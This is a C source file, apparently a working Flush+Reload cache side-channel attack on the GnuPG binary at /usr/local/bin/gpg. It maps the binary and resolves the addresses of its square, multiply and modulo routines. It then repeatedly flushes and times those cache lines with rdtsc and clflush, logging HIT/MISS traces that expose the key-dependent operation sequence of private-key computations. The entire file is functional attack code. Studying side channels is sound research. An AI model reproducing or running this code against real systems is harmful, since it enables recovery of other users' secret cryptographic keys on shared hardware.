#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdbool.h>
#include <sched.h>

#include "constants.h"
#include "symbol_resolver.h"

static inline int probe(char *adrs) {
    volatile unsigned long time;
    asm __volatile__ (
        "   mfence \n "
        "   lfence \n "
        "   rdtsc \n "
        "   lfence \n "
        "   movl %%eax, %%esi \n "
        "   movl (%1), %%eax \n "
        "   lfence \n "
        "   rdtsc \n "
        "   subl %%esi, %%eax \n "
        "   clflush 0(%1) \n "
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time;
}

static inline unsigned long gettime() {
  volatile unsigned long tl;
  asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
  return tl;
}

static inline void flush(char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}

int main() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);

    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
        return 1;
    }


    const char *filepath = "/usr/local/bin/gpg";
    
    struct ProbeAddresses addrs;
    if (!resolve_symbols(filepath, &addrs)) {
        printf("\n");
        use_fallback_addresses(&addrs);
    }
    
    int fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("Error opening file\n");
        return 1;
    }

    struct stat st;
    fstat(fd, &st);

    char *gpg = (char *) mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (gpg == MAP_FAILED) {
        printf("mmap failed\n");
        close(fd);
        return 1;
    }

    char *modulo = (char *)(((uintptr_t)(gpg + addrs.div + 0x234)) & ~0x3fUL);  // divq instruction in loop
    char *mul = (char *)(((uintptr_t)(gpg + addrs.mul + 0xb0)) & ~0x3fUL);      // addmul in mul_n
    char *sqr = (char *)(((uintptr_t)(gpg + addrs.sqr + 0x133)) & ~0x3fUL);     // call to sqr_n_basecase
    
    flush(sqr);
    flush(modulo);
    flush(mul);
    
    int timeslot = 0;
    int *sqr_probe_times = malloc(MAX_PROBES * sizeof(int));
    int *modulo_probe_times = malloc(MAX_PROBES * sizeof(int));
    int *mul_probe_times = malloc(MAX_PROBES * sizeof(int));

    flush(sqr);
    flush(modulo);
    flush(mul);

    unsigned long slotstart = gettime();
    unsigned long slotsize = BUSY;
    unsigned long current;

    while(timeslot < MAX_PROBES) {
        sqr_probe_times[timeslot] = probe(sqr);
        modulo_probe_times[timeslot] = probe(modulo);
        mul_probe_times[timeslot] = probe(mul);

        timeslot++;

        do {
            current = gettime();
        } while (current - slotstart < slotsize);
        
        slotstart += slotsize;
        
        while (current - slotstart > slotsize) {
            slotstart += slotsize;
        }
    }
    
    
    FILE* output = fopen("outputs/outputs.txt", "w");
    FILE* hits = fopen("outputs/hits.txt", "w");


    fprintf(output, "slot \t sqr \t mod \t mul\n"); 

    // write the three data as a single file for easier analysis
    for (int i = 0; i < MAX_PROBES; i++) {
        fprintf(output, "%d \t %d \t %d \t %d\n", i, sqr_probe_times[i], modulo_probe_times[i], mul_probe_times[i]);
        fprintf(hits, "%d \t %s \t %s \t %s\n", i, 
            sqr_probe_times[i] < THRESHOLD ? "HIT" : "MISS", 
            modulo_probe_times[i] < THRESHOLD ? "HIT" : "MISS", 
            mul_probe_times[i] < THRESHOLD ? "HIT" : "MISS");
    }

    fclose(output);
    fclose(hits);
    
    munmap(gpg, st.st_size);
    close(fd);
    
    return 0;
}
